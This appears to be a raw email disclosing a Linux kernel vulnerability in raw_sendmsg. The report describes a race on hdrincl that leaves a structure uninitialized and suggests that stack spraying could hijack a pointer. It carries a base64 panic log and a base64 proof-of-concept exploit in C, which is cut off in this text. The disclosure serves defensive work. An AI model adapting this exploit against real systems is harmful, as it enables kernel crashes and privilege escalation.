+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">####### <span class=3D"gmail-Apple-converted-space">=
+=C2=A0 </span>BUG DETAILS<span class=3D"gmail-Apple-converted-space">=C2=A0=
+ </span>############</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">in net/ipv4/raw.c:</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">static int raw_sendmsg(struct sock *sk, struct msghd=
+r *msg, size_t len)</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">{</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>struct raw_frag_vec rfv;=C2=A0<span class=3D"gmail-Apple=
+-tab-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab=
+-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-spa=
+n" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" s=
+tyle=3D"white-space:pre">	</span>[1]</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>if (!inet-&gt;hdrincl) {=C2=A0<span class=3D"gmail-Apple=
+-tab-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab=
+-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-spa=
+n" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" s=
+tyle=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=
+=3D"white-space:pre">	</span>[2]</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>rfv.msg =3D msg;</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>rfv.hlen =3D 0;</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>err =3D raw_probe_proto_opt(&amp;rfv, &amp;fl4);</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>if (err)</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
+e">	</span>goto done;</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>}</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><span class=3D"gmail-Apple-tab-span"=
+ style=3D"white-space:pre">	</span></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>if (inet-&gt;hdrincl)=C2=A0<span class=3D"gmail-Apple-ta=
+b-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-sp=
+an" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" =
+style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" styl=
+e=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D=
+"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"whi=
+te-space:pre">	</span>[3]</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>err =3D raw_send_hdrinc(sk, &amp;fl4, msg, len,</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
+e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
+</span>=C2=A0=C2=A0 =C2=A0 =C2=A0&amp;rt, msg-&gt;msg_flags, &amp;ipc.sockc=
+);</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>=C2=A0else {</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>sock_tx_timestamp(sk, ipc.sockc.tsflags, &amp;ipc.tx_flags);=
+</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>if (!ipc.addr)</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
+e">	</span>ipc.addr =3D fl4.daddr;</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>lock_sock(sk);</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span>err =3D ip_append_data(sk, &amp;fl4, raw_getfrag,</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
+e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
+</span>=C2=A0=C2=A0 =C2=A0 &amp;rfv, len, 0,<span class=3D"gmail-Apple-tab-=
+span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span=
+" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" st=
+yle=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=
+=3D"white-space:pre">	</span>[4]</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
+e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
+e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
+</span>=C2=A0=C2=A0 =C2=A0 &amp;ipc, &amp;rt, msg-&gt;msg_flags);</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
+space:pre">	</span>...</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">}</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">[1] rfv is not initialized and contains a pointer to=
+ a msghdr header structure.</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">[2], [3] There are multiple checks against inet-&gt;=
+hdrincl without a lock.</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">When we achieve (by racing inet-&gt;hdrincl via sets=
+ockopt()) inet-&gt;hdrincl=3D1 in [1], and inet-&gt;hdrincl=3D0 in [2], rfv=
+ variable remains uninitialized and used in [4].</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">By spraying the stack with controlled user data , we=
+ can take control of msg pointer which is used later in ip_append_data().</=
+p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">In attachment =C2=A0: poc.c + kernel panic log</p>
+<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69);min-height:14px"><br></p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">####### <span class=3D"gmail-Apple-converted-space">=
+=C2=A0 </span>CREDITS<span class=3D"gmail-Apple-converted-space">=C2=A0 </s=
+pan>############</p>
+<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
+gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
+mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
+;;color:rgb(69,69,69)">Mohamed GHANNAM</p></div>
+
+--001a11482b1cb7a17d05606a34dd--
+
+--001a11482b1cb7a18005606a34df
+Content-Type: application/octet-stream; name="panic.log"
+Content-Disposition: attachment; filename="panic.log"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jb8lswlh0
+
+WyAgICAyLjc2Mjg0MV0gZ2VuZXJhbCBwcm90ZWN0aW9uIGZhdWx0OiAwMDAw
+IFsjMV0gU01QClsgICAgMi43NjMxNzBdIE1vZHVsZXMgbGlua2VkIGluOgpb
+ICAgIDIuNzYzMzM5XSBDUFU6IDMgUElEOiAzNDgyIENvbW06IGljbXAgTm90
+IHRhaW50ZWQgNC4xNS4wLXJjMisgIzIxClsgICAgMi43NjM2NzhdIEhhcmR3
+YXJlIG5hbWU6IFFFTVUgU3RhbmRhcmQgUEMgKGk0NDBGWCArIFBJSVgsIDE5
+OTYpLCBCSU9TIFVidW50dS0xLjguMi0xdWJ1bnR1MSAwNC8wMS8yMDE0Clsg
+ICAgMi43NjQxOTFdIFJJUDogMDAxMDpjc3VtX2FuZF9jb3B5X2Zyb21faXRl
+cl9mdWxsKzB4MC8weDNkMApbICAgIDIuNzY0NDk3XSBSU1A6IDAwMTg6ZmZm
+ZmM5MDAwNWFkN2FhMCBFRkxBR1M6IDAwMDEwMjAzClsgICAgMi43NjQ3ODBd
+IFJBWDogMDAwMDAwMDAwMDAwMDAwMCBSQlg6IGZmZmY4ODAyMzJjNjEwMDAg
+UkNYOiAxMTExMTExMTAxMDAxMTIxClsgICAgMi43NjUxNjNdIFJEWDogZmZm
+ZmM5MDAwNWFkN2FhYyBSU0k6IDAwMDAwMDAwMDAwMDY0MDAgUkRJOiBmZmZm
+ODgwMjMwZmIwMDI0ClsgICAgMi43NjU1NDVdIFJCUDogMDAwMDAwMDAwMDAw
+MDAwMCBSMDg6IDAwMDAwMDAwMDAwMDAwMDAgUjA5OiBmZmZmODgwMjMyYzYx
+MDAwClsgICAgMi43NjU5MzBdIFIxMDogZmZmZjg4MDIzMGZiMDAyNCBSMTE6
+IDAwMDAwMDAwMDAwMDAwMDMgUjEyOiAwMDAwMDAwMDAwMDA2NDAwClsgICAg
+Mi43NjYzMTFdIFIxMzogMDAwMDAwMDAwMDAwMDAwMCBSMTQ6IGZmZmY4ODAy
+MzM4OWExNDggUjE1OiAwMDAwMDAwMDAwMDA2NDAwClsgICAgMi43NjY2OThd
+IEZTOiAgMDAwMDdmNGRhNGM2ZTcwMCgwMDAwKSBHUzpmZmZmODgwMjNmZDgw
+MDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc2NzEz
+OF0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAwMDAwMDA4
+MDA1MDAzMwpbICAgIDIuNzY3NDQ4XSBDUjI6IDAwMDAwMDAwMDIwM2EwNDAg
+Q1IzOiAwMDAwMDAwMjM1ZWIyMDAwIENSNDogMDAwMDAwMDAwMDAwMDZlMApb
+ICAgIDIuNzY3ODMxXSBEUjA6IDAwMDAwMDAwMDAwMDAwMDAgRFIxOiAwMDAw
+MDAwMDAwMDAwMDAwIERSMjogMDAwMDAwMDAwMDAwMDAwMApbICAgIDIuNzY4
+MjEzXSBEUjM6IDAwMDAwMDAwMDAwMDAwMDAgRFI2OiAwMDAwMDAwMGZmZmUw
+ZmYwIERSNzogMDAwMDAwMDAwMDAwMDQwMApbICAgIDIuNzY4NjAwXSBDYWxs
+IFRyYWNlOgpbICAgIDIuNzY4NzQxXSAgaXBfZ2VuZXJpY19nZXRmcmFnKzB4
+M2QvMHg5MApbICAgIDIuNzY4OTYwXSAgX19pcF9hcHBlbmRfZGF0YS5pc3Jh
+LjQ4KzB4NjlmLzB4ODUwClsgICAgMi43NjkyMzJdICA/IHJhd19kZXN0cm95
+KzB4MjAvMHgyMApbICAgIDIuNzY5NDM0XSAgPyByYXdfZGVzdHJveSsweDIw
+LzB4MjAKWyAgICAyLjc2OTYyNV0gIGlwX2FwcGVuZF9kYXRhLnBhcnQuNTAr
+MHg2Ny8weGMwClsgICAgMi43Njk4NTddICByYXdfc2VuZG1zZysweDcxMC8w
+eDllMApbICAgIDIuNzcwMDY4XSAgPyBfY29weV9mcm9tX3VzZXIrMHgzMS8w
+eDYwClsgICAgMi43NzAyODJdICA/IGltcG9ydF9pb3ZlYysweDI3LzB4YzAK
+WyAgICAyLjc3MDQ5MF0gIHNvY2tfc2VuZG1zZysweDJiLzB4NDAKWyAgICAy
+Ljc3MDY3OF0gIF9fX3N5c19zZW5kbXNnKzB4MjllLzB4MmIwClsgICAgMi43
+NzA4ODRdICA/IHJlbGVhc2Vfc29jaysweDdhLzB4OTAKWyAgICAyLjc3MTA5
+OV0gID8gZG9faXBfc2V0c29ja29wdC5pc3JhLjEyKzB4MWIzLzB4ZTAwClsg
+ICAgMi43NzEzNjRdICA/IF9fc3lzX3NlbmRtc2crMHgzYy8weDcwClsgICAg
+Mi43NzE1NzVdICBfX3N5c19zZW5kbXNnKzB4M2MvMHg3MApbICAgIDIuNzcx
+NzY3XSAgZW50cnlfU1lTQ0FMTF82NF9mYXN0cGF0aCsweDEzLzB4NmMKWyAg
+ICAyLjc3MjAxMl0gUklQOiAwMDMzOjB4NDA1MmYxClsgICAgMi43NzIxOThd
+IFJTUDogMDAyYjowMDAwN2Y0ZGE0YzZkZGEwIEVGTEFHUzogMDAwMDAyOTMg
+T1JJR19SQVg6IDAwMDAwMDAwMDAwMDAwMmUKWyAgICAyLjc3MjYxMV0gUkFY
+OiBmZmZmZmZmZmZmZmZmZmRhIFJCWDogMDAwMDdmNGRhNGM2ZTcwMCBSQ1g6
+IDAwMDAwMDAwMDA0MDUyZjEKWyAgICAyLjc3Mjk4M10gUkRYOiAwMDAwMDAw
+MDAwMDAwMDAwIFJTSTogMDAwMDAwMDAwMTkyMWJlMCBSREk6IDAwMDAwMDAw
+MDAwMDAwMDMKWyAgICAyLjc3MzM4Ml0gUkJQOiAwMDAwN2ZmZDBmOWQzZmYw
+IFIwODogMDAwMDAwMDAwMDAwMDAwNCBSMDk6IDAwMDA3ZjRkYTRjNmU3MDAK
+WyAgICAyLjc3Mzc0OF0gUjEwOiAwMDAwN2Y0ZGE0YzZkZGMwIFIxMTogMDAw
+MDAwMDAwMDAwMDI5MyBSMTI6IDAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc3
+NDEzOV0gUjEzOiAwMDAwN2ZmZDBmOWQzZmVmIFIxNDogMDAwMDdmNGRhNGM2
+ZTljMCBSMTU6IDAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc3NDUzMV0gQ29k
+ZTogZjcgNDggMjkgZWYgZTggZjIgYTcgNWQgMDAgNDggMjkgZWIgMGYgODQg
+MjkgZmUgZmYgZmYgZWIgYzkgNGMgODkgZWIgMzEgYzAgZTkgMGMgZmUgZmYg
+ZmYgNGMgODkgZWIgZWIgYmEgMzEgYzAgZTkgMDAgZmUgZmYgZmYgOTAgPDhi
+PiAwMSBhOCAwOCAwZiA4NSA4MCAwMSAwMCAwMCA0MSA1NyA0MSA1NiA0OSA4
+OSBmNyA0MSA1NSA0MSA1NCAKWyAgICAyLjc3NTU2N10gUklQOiBjc3VtX2Fu
+ZF9jb3B5X2Zyb21faXRlcl9mdWxsKzB4MC8weDNkMCBSU1A6IGZmZmZjOTAw
+MDVhZDdhYTAKWyAgICAyLjc3NTk2N10gLS0tWyBlbmQgdHJhY2UgZmY0ZDU5
+NTY0ZmVkMjEzYyBdLS0tClsgICAgMi43NzYyMzldIEtlcm5lbCBwYW5pYyAt
+IG5vdCBzeW5jaW5nOiBGYXRhbCBleGNlcHRpb24KWyAgICAyLjc3NjcxMV0g
+S2VybmVsIE9mZnNldDogZGlzYWJsZWQKWyAgICAyLjc3NjkwM10gUmVib290
+aW5nIGluIDEgc2Vjb25kcy4uCg==
+
+--001a11482b1cb7a18005606a34df
+Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
+Content-Disposition: attachment; filename="poc.c"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jb8lswlv1
+
+I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1
+ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1
+bmlzdGQuaD4KI2luY2x1ZGUgPHNjaGVkLmg+CiNpbmNsdWRlIDxwdGhyZWFk
+Lmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlw
+ZXMuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPHBvbGwu
+aD4KCiNkZWZpbmUgQ0hLRVJSKGNvbmQsbXNnKSAgICBpZigoY29uZCkpIHsJ
+XAoJCXBlcnJvcigobXNnKSk7CQkJXAoJfQojZGVmaW5lIFBTSVpFCQkxMDAK
+I2RlZmluZSBUSURTSVpFCQkxMDAwMAoKcHRocmVhZF90IHRpZDFbVElEU0la
+RV07CnB0aHJlYWRfdCB0aWQyW1RJRFNJWkVdOwoKCmludCB2YWwwID0gMDsK
+c3RydWN0IG1zZ2hkciAqbXNnID0gTlVMTDsKc3RydWN0IHNvY2thZGRyX2lu
+IHNpbj0gey5zaW5fcG9ydCA9IDB9OwpzdHJ1Y3QgaW92ZWMgaW92WzI1Nl07
+CmludCBpOwp1bnNpZ25lZCBjaGFyIGJ1ZltQU0laRV07CmNoYXIgcGF5bG9h
+ZFsyMDQ4XTsKaW50IGZkc29jazsKdm9pZCBjcmVhdGVfbnModm9pZCkKewoJ
+aWYodW5zaGFyZShDTE9ORV9ORVdVU0VSKSAhPSAwKSB7CgkJcGVycm9yKCJ1
